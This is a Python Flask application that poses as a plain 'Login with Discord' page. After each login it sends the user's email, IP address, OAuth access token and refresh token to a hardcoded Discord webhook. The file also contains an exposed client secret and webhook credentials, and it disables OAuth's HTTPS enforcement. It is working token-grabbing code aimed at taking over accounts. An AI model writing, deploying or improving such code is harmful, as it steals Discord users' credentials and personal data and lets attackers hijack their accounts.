from requests_oauthlib import OAuth2Session
from flask import Flask, request, redirect, session
import os
import requests

os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

base_discord_api_url = 'https://discordapp.com/api'
client_id = '1178048620939972798'
client_secret = "84mKESgz8NKl-wvDb8i5UGP-_b3WqQgs"
redirect_uri = 'https://flask-production-6a75.up.railway.app/oauth_callback'
scope = ['identify', 'email', 'connections']
token_url = 'https://discordapp.com/api/oauth2/token'
authorize_url = 'https://discordapp.com/api/oauth2/authorize'

app = Flask(__name__)
app.secret_key = os.urandom(24)

def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, color="#00FF00"):
    embed = {
        'title': 'Discord OAuth Data',
        'color': int(color.lstrip("#"), 16), 
        'fields': [
            {'name': 'User ID', 'value': str(user_id), 'inline': True},
            {'name': 'Username', 'value': profile_data['username'], 'inline': True},
            {'name': 'Email', 'value': profile_data['email'], 'inline': True},
            {'name': 'Access Token', 'value': access_token, 'inline': True},
            {'name': 'Refresh Token', 'value': refresh_token, 'inline': True},
            {'name': 'User IP', 'value': user_ip, 'inline': True}
        ]
    }
    return embed

@app.route("/")
def home():
    # Generate a random state and store it in the session
    state = os.urandom(24)
    session['state'] = state

    oauth = OAuth2Session(client_id, redirect_uri="https://flask-production-6a75.up.railway.app/oauth_callback", scope=scope, state=state)
    login_url, _ = oauth.authorization_url(authorize_url)

    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord OAuth Login</title>
    </head>
    <body>
        <h1>Discord OAuth Login</h1>
        <p>Click the button below to log in with Discord:</p>
        <a href="{login_url}"><button>Login with Discord</button></a>
    </body>
    </html>
    '''

@app.route("/oauth_callback")
def oauth_callback():
    try:
        # Check if 'state' is present in the query parameters
        if 'state' not in request.args:
            return 'Invalid callback. Missing state parameter.'

        # Verify that the state in the query parameters matches the one stored in the session
        if request.args['state'] != session.get('state'):
            return 'Invalid callback. State mismatch.'

        discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
        token = discord.fetch_token(
            token_url,
            client_secret=client_secret,
            authorization_response=request.url,
        )

        # Store the token in the session
        session['discord_token'] = token

        response = discord.get(base_discord_api_url + '/users/@me')
        user_id = response.json()['id']

        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'

        profile_data = response.json()
        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")

        data = {'embeds': [embed]}
        response = requests.post(webhook_url, json=data)

        if response.status_code == 200:
            print("Webhook request successful")
        else:
            print(f"Webhook request failed with status code {response.status_code}")
            print(response.text)

        return 'Authentication successful. Your data has been sent to the webhook.'

    except Exception as e:
        # Print the detailed error message
        print(f"An error occurred: {e}")
        return f'An error occurred during authentication. Details: {e}'

@app.route("/profile")
def profile():
    if 'discord_token' not in session:
        return 'You are not logged in. Please <a href="/">login with Discord</a> first.'
    discord = OAuth2Session(client_id, token=session['discord_token'])
    response = discord.get(base_discord_api_url + '/users/@me')
    user_id = response.json()['id']
    return f'Profile: {user_id}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
